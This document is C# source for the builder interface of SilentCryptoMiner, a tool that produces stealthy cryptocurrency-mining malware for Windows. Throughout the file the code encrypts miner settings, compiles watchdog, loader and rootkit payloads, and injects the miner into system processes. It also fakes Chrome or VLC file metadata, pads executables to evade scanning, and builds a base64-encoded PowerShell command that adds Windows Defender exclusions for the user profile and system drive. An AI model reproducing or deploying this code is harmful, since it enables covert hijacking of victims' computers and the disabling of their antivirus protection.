using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using FormSerialisation;

namespace SilentCryptoMiner
{
    public partial class Builder
    {
        /* Silent Crypto Miner by Unam Sanctam https://github.com/UnamSanctam/SilentCryptoMiner */

        public Builder()
        {
            InitializeComponent();
        }

        public AlgorithmSelection FormAS = new AlgorithmSelection();
        public AdvancedOptions FormAO = new AdvancedOptions();

        public Random rand = new Random();
        public string advancedParamsXMR = "--randomx-no-rdmsr";
        public string advancedParamsETH = "";
        public byte[] watchdogdata = new byte[] { };
        public List<string> randomiCache = new List<string>();

        public List<string> fullnids = new List<string>();

        public bool mineETH = false;
        public bool mineXMR = false;
        public bool xmrGPU = false;
        public string savePath;

        public string AESKEY;
        public string SALT;
        public string IV;
        public string KEY;

        public string UNAMKEY = "UXUUXUUXUUCommandULineUUXUUXUUXU";
        public string UNAMIV = "UUCommandULineUU";

        public string Resources_xmr;
        public string Resources_eth;
        public string Resources_libs;
        public string Resources_watchdog;
        public string Resources_winring;
        public string Resources_rootkiti;
        public string Resources_rootkitu;
        public string Resources_runpe;
        public string Resources_parent;

        public string minerFind;
        public string watchdogID;
        public string eid;
        public string xid;

        public string defenderCommands;

        private void Form1_Load(object sender, EventArgs e)
        {
            cFormAO.Items.Add(FormAO);
            Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
            FormAS.Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
            FormAO.Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
            Codedom.F = this;
            FormAS.F = this;
            FormAO.F = this;
            randomiCache.Add("SilentCryptoMiner");
            eid = Randomi(1);
            xid = Randomi(1);
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            try
            {
                if (BuildErrorTest(listMiners.Items.Count == 0, "Error: Atleast 1 miner required to build.")) return;
                if (BuildErrorTest(chkIcon.Checked && !File.Exists(txtIconPath.Text), "Error: Icon file could not be found.")) return;

                if (chkInstall.Checked)
                {
                    foreach (var item in @"\/:*?""<>|")
                    {
                        if (BuildErrorTest(txtInstallEntryName.Text.Contains(item), "Error: Startup option \"Entry Name\" contains any of the following illegal characters: \\/:*?\"<>| ")) return;
                    }
                }

                savePath = SaveDialog("Exe Files (.exe)|*.exe|All Files (*.*)|*.*");
                if(savePath.Length > 0)
                {
                    workerBuild.RunWorkerAsync();
                }
            }
            catch (Exception ex)
            {
                BuildError("Error: An error occured while starting the build process: " + ex.Message);
            }
        }

        private void workerBuild_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            try
            {
                Invoke(new Action(() => txtLog.ResetText()));
                BuildLog("Starting...");
                BuildLog("Randomizing keys...");

                xmrGPU = false;
                fullnids = new List<string>();
                mineETH = false;
                mineXMR = false;

                AESKEY = Randomi(256);
                SALT = Randomi(32);
                IV = Randomi(16);
                KEY = Randomi(32);
                minerFind = Randomi(rand.Next(8, 16));
                watchdogID = Randomi(rand.Next(8, 16));

                Resources_xmr = Randomi(rand.Next(5, 20));
                Resources_eth = Randomi(rand.Next(5, 20));
                Resources_libs = Randomi(rand.Next(5, 20));
                Resources_watchdog = Randomi(rand.Next(5, 20));
                Resources_winring = Randomi(rand.Next(5, 20));
                Resources_rootkiti = Randomi(rand.Next(5, 20));
                Resources_rootkitu = Randomi(rand.Next(5, 20));
                Resources_runpe = Randomi(rand.Next(5, 20));
                Resources_parent = Randomi(rand.Next(5, 20));

                defenderCommands = $"cmd /c powershell -EncodedCommand \"{Convert.ToBase64String(Encoding.Unicode.GetBytes($"<#{Randomi(rand.Next(2, 5), false)}#> Add-MpPreference <#{Randomi(rand.Next(2, 5), false)}#> -ExclusionPath @($env:UserProfile,$env:SystemDrive) <#{Randomi(rand.Next(2, 5))}#> -Force <#{Randomi(rand.Next(2, 5))}#>"))}\"";

                StringBuilder minerbuilder = new StringBuilder(Properties.Resources.Program);

                List<string> minerSet = new List<string>();

                string savePathBase = Path.Combine(Path.GetDirectoryName(savePath), Path.GetFileNameWithoutExtension(savePath));

                BuildLog("Building miner sets...");
                foreach (dynamic miner in listMiners.Items)
                {
                    if (BuildErrorTest(miner.toggleIdle.Checked && OnlyDigits(miner.txtIdleWait.Text) && int.Parse(miner.txtIdleWait.Text) < 0, $"Error: Miner {miner.nid}: Idle Wait time must be a number and not negative.")) return;
                    StringBuilder argstr = new StringBuilder();
                    bool xmr = miner.GetType() == typeof(MinerXMR);

                    mineXMR = xmr || mineXMR;
                    mineETH = !xmr || mineETH;

                    if (xmr)
                    {
                        argstr.Append($"--algo={Invoke(new Func<string>(() => miner.comboAlgorithm.Text))} {(miner.chkAdvParam.Checked ? miner.txtAdvParam.Text : advancedParamsXMR)} --url={miner.txtPoolURL.Text} --user={miner.txtPoolUsername.Text} --pass={miner.txtPoolPassword.Text} --cpu-max-threads-hint={Invoke(new Func<string>(() => miner.comboMaxCPU.Text.Replace("%", "")))}");
                    }
                    else
                    {
                        argstr.Append($"--cinit-algo={Invoke(new Func<string>(() => miner.comboAlgorithm.Text))} --pool={formatETHUrl(miner)} {(miner.chkAdvParam.Checked ? miner.txtAdvParam.Text : advancedParamsETH)} --cinit-max-gpu={Invoke(new Func<string>(() => miner.comboMaxGPU.Text.Replace("%", "")))}");
                    }

                    if (miner.chkRemoteConfig.Checked)
                    {
                        argstr.Append($" --cinit-remote-config=\"{miner.txtRemoteConfig.Text}\"");
                    }

                    if (miner.toggleStealth.Checked && miner.txtStealthTargets.Text.Length > 0)
                    {
                        argstr.Append($" --cinit-stealth-targets=\"{miner.txtStealthTargets.Text}\"");
                    }

                    if (miner.toggleProcessKiller.Checked && miner.txtKillTargets.Text.Length > 0)
                    {
                        argstr.Append($" --cinit-kill-targets=\"{miner.txtKillTargets.Text}\"");
                    }

                    if (miner.chkAPI.Checked && miner.txtAPI.Text.Length > 0)
                    {
                        argstr.Append($" --cinit-api=\"{miner.txtAPI.Text}\"");
                    }

                    if (xmr)
                    {
                        if (miner.toggleNicehash.Checked)
                        {
                            argstr.Append(" --nicehash");
                        }

                        if (!miner.toggleCPU.Checked)
                        {
                            argstr.Append(" --no-cpu");
                        }

                        if (miner.toggleSSL.Checked)
                        {
                            argstr.Append(" --tls");
                        }

                        if (miner.toggleGPU.Checked)
                        {
                            argstr.Append(" --cuda --opencl");
                            xmrGPU = true;
                        }

                        if (miner.toggleIdle.Checked)
                        {
                            argstr.Append($" --cinit-idle-wait={miner.txtIdleWait.Text} --cinit-idle-cpu={Invoke(new Func<string>(() => miner.comboIdleCPU.Text.Replace("%", "")))}");
                        }
                    }
                    else
                    {
                        if (miner.toggleIdle.Checked)
                        {
                            argstr.Append($" --cinit-idle-wait={miner.txtIdleWait.Text} --cinit-idle-gpu={Invoke(new Func<string>(() => miner.comboIdleGPU.Text.Replace("%", "")))}");
                        }
                    }
                    string minerid = $"{minerFind}{(xmr ? xid : eid)}{miner.nid} ";
                    string injectionTarget = Invoke(new Func<string>(() => miner.comboInjection.Text)).ToString();
                    minerSet.Add(string.Format("new string[] {{\"{0}\",\"{1}\",\"{2}\",\"{3}\"}}", EncryptString(minerid), xmr ? xid : eid, EncryptString(minerid + Unamlib_Encrypt(argstr.ToString())), EncryptString(FormAO.toggleRootkit.Checked ? "System32\\dialer.exe" : (injectionTarget != "explorer.exe" ? "System32\\" : "") + injectionTarget)));
                    fullnids.Add(string.Format("new string[] {{\"{0}\",\"{1}\"}}", EncryptString(minerid), xmr ? xid : eid));
                }

                minerbuilder.Replace("MINERSET", string.Join(",", minerSet));

                if (chkInstall.Checked)
                {
                    BuildLog("Adding install... ");
                    if (toggleWatchdog.Checked)
                    {
                        BuildLog("Compiling Watchdog payload...");
                        string watchdogpath = savePathBase + "-watchdog";
                        if (Codedom.WatchdogCompiler(watchdogpath + ".exe", Properties.Resources.Watchdog, toggleAdministrator.Checked))
                        {
                            if (toggleObfuscation.Checked)
                            {
                                ObfuscationMessage("Watchdog Payload", watchdogpath + ".exe");
                            }

                            if (toggleShellcode.Checked || FormAO.toggleMemoryWatchdog.Checked)
                            {
                                BuildLog("Compiling Watchdog loader...");
                                if (Codedom.LoaderCompiler(watchdogpath + "-loader.exe", watchdogpath + ".exe", $"\"{watchdogID}\"", null, false, toggleAdministrator.Checked))
                                {
                                    if (toggleObfuscation.Checked)
                                    {
                                        ObfuscationMessage("Watchdog Loader", watchdogpath + "-loader.exe");
                                    }

                                    watchdogdata = File.ReadAllBytes(watchdogpath + "-loader.exe");
                                    File.Delete(watchdogpath + "-loader.exe");                                   
                                }
                                else
                                {
                                    BuildError("Error compiling Watchdog loader!");
                                    return;
                                }
                            }
                            else
                            {
                                watchdogdata = File.ReadAllBytes(watchdogpath + ".exe");
                            }

                            File.Delete(watchdogpath + ".exe");
                        }
                        else
                        {
                            BuildError("Error compiling Watchdog payload!");
                            return;
                        }
                    }
                }

                BuildLog("Compiling Miner payload...");
                string MinerSource = minerbuilder.ToString();
                string minerpath = savePathBase + (toggleShellcode.Checked ? "-miner.exe" : ".exe");
                if (Codedom.MinerCompiler(minerpath, MinerSource, (chkIcon.Checked && txtIconPath.Text != "" ? txtIconPath.Text : null), toggleAdministrator.Checked))
                {
                    if (toggleObfuscation.Checked)
                    {
                        ObfuscationMessage("Miner Payload", minerpath);
                    }

                    string uninstallerpath = savePathBase + "-uninstaller";
                    BuildLog("Compiling Uninstaller payload...");
                    Codedom.UninstallerCompiler(uninstallerpath + (toggleShellcode.Checked ? "-payload.exe" : ".exe"));
                    if (toggleShellcode.Checked)
                    {
                        BuildLog("Compiling Miner loader...");
                        if (Codedom.LoaderCompiler(savePath, minerpath, "buffer", chkIcon.Checked && !ReferenceEquals(txtIconPath.Text, "") ? txtIconPath.Text : null, chkAssembly.Checked, toggleAdministrator.Checked))
                        {
                            if (toggleObfuscation.Checked)
                            {
                                ObfuscationMessage("Miner Loader", minerpath);
                            }
                            try
                            {
                                File.Delete(minerpath);
                            }
                            catch { }
                        }
                        else
                        {
                            BuildError("Error compiling Miner loader!");
                            return;
                        }

                        BuildLog("Compiling Uninstaller loader...");
                        if (Codedom.LoaderCompiler(uninstallerpath + ".exe", uninstallerpath + "-payload.exe", "\"\"", null, false, toggleAdministrator.Checked))
                        {
                            try
                            {
                                File.Delete(uninstallerpath + "-payload.exe");
                            }
                            catch {}
                        }
                        else
                        {
                            BuildError("Error compiling Uninstaller loader!");
                        }
                    }

                    BuildLog("Compiling Miner Checker...");
                    Codedom.CheckerCompiler(savePathBase + "-checker.exe");

                    IncreaseExeFile(savePathBase);

                    BuildLog("Done!");
                    btnBuild.Invoke(new Action(() => btnBuild.Text = "Build"));
                    btnBuild.Invoke(new Action(() => btnBuild.Enabled = true));
                }
                else
                {
                    BuildError("Error compiling Miner payload!");
                    return;
                }
            }
            catch (Exception ex)
            {
                BuildError("Error: An error occured while building the file: " + ex.Message);
                return;
            }
        }

        private void IncreaseExeFile(string savePathBase)
        {
            double exeSize = 0;

            if (!string.IsNullOrWhiteSpace(txtExeSize.Text) && double.TryParse(txtExeSize.Text, out exeSize) && exeSize > 0)
            {

                BuildLog("Increasing executable size...");

                exeSize *= 1048576;

                File.Copy(string.Format("{0}.exe", savePathBase), string.Format("{0}-increased.exe", savePathBase));

                using (FileStream fileStream = File.OpenWrite(string.Format("{0}-increased.exe", savePathBase)))
                {
                    long fsSeek = fileStream.Seek(0L, SeekOrigin.End);
                    while (fsSeek < exeSize)
                    {
                        fileStream.WriteByte(0);
                        fsSeek += 1L;
                    }
                }
            }
        }

        public string formatETHUrl(MinerETH miner)
        {
            return Invoke(new Func<string>(() => miner.comboPoolScheme.Text.Split(' ')[0])) + "://" + "`" + miner.txtPoolUsername.Text + "`" + (string.IsNullOrEmpty(miner.txtPoolWorker.Text) ? "" : "." + miner.txtPoolWorker.Text) + (string.IsNullOrEmpty(miner.txtPoolPassowrd.Text) ? "" : ":" + miner.txtPoolPassowrd.Text) + (string.IsNullOrEmpty(miner.txtPoolUsername.Text) ? "" : "@") + miner.txtPoolURL.Text + (string.IsNullOrEmpty(miner.txtPoolData.Text) ? "" : "/" + miner.txtPoolData.Text);
        }

        public byte[] AES_Encryptor(byte[] input)
        {
            using (var mStream = new MemoryStream())
            {
                using (var cStream = new CryptoStream(mStream, new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC }.CreateEncryptor(new Rfc2898DeriveBytes(AESKEY, Encoding.ASCII.GetBytes(SALT), 100).GetBytes(16), Encoding.ASCII.GetBytes(IV)), CryptoStreamMode.Write))
                {
                    cStream.Write(input, 0, input.Length);
                    cStream.Close();
                }
                return mStream.ToArray();
            }
        }

        public string EncryptString(string input)
        {
            return Convert.ToBase64String(AES_Encryptor(Encoding.UTF8.GetBytes(input)));
        }

        public bool BuildErrorTest(bool condition, string message)
        {
            if (condition)
            {
                MessageBox.Show(message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Invoke(new Action(() => btnBuild.Enabled = true));
                Invoke(new Action(() => btnBuild.Text = "Build"));
                return true;
            }
            return false;
        }

        public void BuildLog(string message)
        {
            Invoke(new Action(() => txtLog.Text += message + Environment.NewLine));
        }

        public void BuildError(string message)
        {
            BuildLog(message);
            Invoke(new Action(() => btnBuild.Text = "Build"));
            Invoke(new Action(() => btnBuild.Enabled = true));
        }

        public void ObfuscationMessage(string name, string path)
        {
            MessageBox.Show($"The {name} has been compiled and can be found in the same folder as the selected miner build path ({path}). Press OK after you're done with obfuscating and replacing the {name}.");
        }

        public string RandomString(int length)
        {
            const string chars = "abcdefghijklmnpqrstuvwxyz0123456789!$&()*+,-./:<=>@[]^_";
            const int clength = 55;
            var buffer = new char[length];
            for (var i = 0; i < length; ++i)
            {
                buffer[i] = chars[rand.Next(clength)];
            }
            return new string(buffer);
        }

        public string Randomi(int length, bool addToCache = true)
        {
            while (true)
            {
                string Chr = "asdfghjklqwertyuiopmnbvcxz";
                var sb = new StringBuilder();
                for (int i = 1, loopTo = length; i <= loopTo; i++)
                {
                    int idx = rand.Next(0, Chr.Length);
                    sb.Append(Chr.Substring(idx, 1));
                }

                if (!randomiCache.Contains(sb.ToString()))
                {
                    if (addToCache)
                    {
                        randomiCache.Add(sb.ToString());
                    }
                    return sb.ToString();
                }
            }
        }

        public char[] CheckNonASCII(string text)
        {
            return text.Where(c => c > 127).ToArray();
        }

        bool OnlyDigits(string str)
        {
            foreach (char c in str)
            {
                if (c < '0' || c > '9')
                    return false;
            }
            return true;
        }

        public string Unamlib_Encrypt(string plainText)
        {
            var input = Encoding.UTF8.GetBytes(plainText);
            using (var mStream = new MemoryStream())
            {
                using (var cStream = new CryptoStream(mStream, new RijndaelManaged() { KeySize = 256, BlockSize = 128, Mode = CipherMode.CBC, Padding = PaddingMode.Zeros }.CreateEncryptor(Encoding.ASCII.GetBytes(UNAMKEY), Encoding.ASCII.GetBytes(UNAMIV)), CryptoStreamMode.Write))
                {
                    cStream.Write(input, 0, input.Length);
                    cStream.FlushFinalBlock();
                    cStream.Close();
                }
                return Convert.ToBase64String(mStream.ToArray());
            }
        }

        public string SaveDialog(string filter)
        {
            SaveFileDialog dialog = new SaveFileDialog
            {
                Filter = filter,
                InitialDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location)
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                return dialog.FileName;
            }
            return "";
        }

        public string LoadDialog(string filter)
        {
            OpenFileDialog dialog = new OpenFileDialog
            {
                Filter = filter,
                InitialDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location)
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                return dialog.FileName;
            }
            return "";
        }

        private void btnAssemblyClone_Click(object sender, EventArgs e)
        {
            var o = new OpenFileDialog();
            o.Filter = "Executable |*.exe";
            if (o.ShowDialog() == DialogResult.OK)
            {
                var info = FileVersionInfo.GetVersionInfo(o.FileName);
                try
                {
                    txtAssemblyTitle.Text = info.InternalName;
                    txtAssemblyDescription.Text = info.FileDescription;
                    txtAssemblyProduct.Text = info.CompanyName;
                    txtAssemblyCompany.Text = info.ProductName;
                    txtAssemblyCopyright.Text = info.LegalCopyright;
                    txtAssemblyTrademark.Text = info.LegalTrademarks;
                }
                catch {}

                string[] version;
                if (info.FileVersion.Contains(","))
                {
                    version = info.FileVersion.Split(',');
                }
                else
                {
                    version = info.FileVersion.Split('.');
                }

                try
                {
                    txtAssemblyVersion1.Text = version[0];
                    txtAssemblyVersion2.Text = version[1];
                    txtAssemblyVersion3.Text = version[2];
                    txtAssemblyVersion4.Text = version[3];
                }
                catch {}
            }
        }

        private void chkIcon_CheckedChanged(object sender)
        {
            chkIcon.Text = chkIcon.Checked ? "Enabled" : "Disabled";
            btnBrowseIcon.Enabled = chkIcon.Checked;
        }

        private void chkInstall_CheckedChanged(object sender)
        {
            chkInstall.Text = chkInstall.Checked ? "Enabled" : "Disabled";
            txtInstallPath.Enabled = chkInstall.Checked;
            txtInstallEntryName.Enabled = chkInstall.Checked;
            txtInstallFileName.Enabled = chkInstall.Checked;
            toggleWatchdog.Enabled = chkInstall.Checked;
            toggleAutoDelete.Enabled = chkInstall.Checked;
        }

        private void chkAssembly_CheckedChanged(object sender)
        {
            chkAssembly.Text = chkAssembly.Checked ? "Enabled" : "Disabled";
            txtAssemblyTitle.Enabled = chkAssembly.Checked;
            txtAssemblyDescription.Enabled = chkAssembly.Checked;
            txtAssemblyProduct.Enabled = chkAssembly.Checked;
            txtAssemblyCompany.Enabled = chkAssembly.Checked;
            txtAssemblyCopyright.Enabled = chkAssembly.Checked;
            txtAssemblyTrademark.Enabled = chkAssembly.Checked;
            txtAssemblyVersion1.Enabled = chkAssembly.Checked;
            txtAssemblyVersion2.Enabled = chkAssembly.Checked;
            txtAssemblyVersion3.Enabled = chkAssembly.Checked;
            txtAssemblyVersion4.Enabled = chkAssembly.Checked;
            btnAssemblyRandom.Enabled = chkAssembly.Checked;
            btnAssemblyClone.Enabled = chkAssembly.Checked;
        }

        private void btnAssemblyRandom_Click(object sender, EventArgs e)
        {
            try
            {
                switch (rand.Next(2))
                {
                    case 0:
                        {
                            txtAssemblyTitle.Text = "chrome.exe";
                            txtAssemblyDescription.Text = "Google Chrome";
                            txtAssemblyProduct.Text = "Google Chrome";
                            txtAssemblyCompany.Text = "Google Inc.";
                            txtAssemblyCopyright.Text = "Copyright 2017 Google Inc. All rights reserved.";
                            txtAssemblyTrademark.Text = "";
                            txtAssemblyVersion1.Text = "70";
                            txtAssemblyVersion2.Text = "0";
                            txtAssemblyVersion3.Text = "3538";
                            txtAssemblyVersion4.Text = "110";
                            break;
                        }

                    case 1:
                        {
                            txtAssemblyTitle.Text = "vlc";
                            txtAssemblyDescription.Text = "VLC media player";
                            txtAssemblyProduct.Text = "VLC media player";
                            txtAssemblyCompany.Text = "VideoLAN";
                            txtAssemblyCopyright.Text = "Copyright © 1996-2018 VideoLAN and VLC Authors";
                            txtAssemblyTrademark.Text = "VLC media player, VideoLAN and x264 are registered trademarks from VideoLAN";
                            txtAssemblyVersion1.Text = "3";
                            txtAssemblyVersion2.Text = "0";
                            txtAssemblyVersion3.Text = "3";
                            txtAssemblyVersion4.Text = "0";
                            break;
                        }
                }
            }
            catch {}
        }

        private void btnBrowseIcon_Click(object sender, EventArgs e)
        {
            try
            {
                var o = new OpenFileDialog();
                o.Filter = "Icon |*.ico";
                if (o.ShowDialog() == DialogResult.OK)
                {
                    txtIconPath.Text = o.FileName;
                    picIcon.ImageLocation = o.FileName;
                }
                else
                {
                    txtIconPath.Text = "";
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void labelGitHub_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/UnamSanctam/SilentCryptoMiner");
        }

        private void labelHackforums_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://hackforums.net/showthread.php?tid=5995773");
        }

        private void labelWiki_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/UnamSanctam/SilentCryptoMiner/wiki");
        }

        private void btnMinerAdd_Click(object sender, EventArgs e)
        {
            FormAS.Show();
        }

        private void btnAdvancedOptions_Click(object sender, EventArgs e)
        {
            FormAO.Show();
        }

        private void btnMinerEdit_Click(object sender, EventArgs e)
        {
            if (listMiners.SelectedItem != null)
            {
                ((dynamic)listMiners.SelectedItem).Show();
            }
        }

        private void btnMinerRemove_Click(object sender, EventArgs e)
        {
            if (listMiners.SelectedItem != null)
            {
                ((dynamic)listMiners.SelectedItem).Hide();
                listMiners.Items.Remove(listMiners.SelectedItem);
                ReloadMinerList();
            }
        }

        public void ReloadMinerList()
        {
            int count = listMiners.Items.Count;
            for (int i = 0; i < count; i++)
            {
                ((dynamic)listMiners.Items[i]).nid = i;
                listMiners.Items[i] = listMiners.Items[i];
            }
        }

        private void btnSaveState_Click(object sender, EventArgs e)
        {
            string savepath = SaveDialog("XML Files (*.xml)|*.xml|All Files (*.*)|*.*");
            if (!string.IsNullOrEmpty(savepath))
            {
                FormSerializer.Serialise(this, savepath);
            }
        }

        private void btnLoadState_Click(object sender, EventArgs e)
        {
            string loadpath = LoadDialog("XML Files (*.xml)|*.xml|All Files (*.*)|*.*");
            if (!string.IsNullOrEmpty(loadpath))
            {
                try
                {
                    FormSerializer.Deserialise(this, loadpath);
                    FormAO = (AdvancedOptions)cFormAO.Items[0];
                    ReloadMinerList();
                } 
                catch {
                    MessageBox.Show("Could not parse the configuration file..", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void chkBlockWebsites_CheckedChanged(object sender)
        {
            txtBlockWebsites.Enabled = chkBlockWebsites.Checked;
        }
    }
}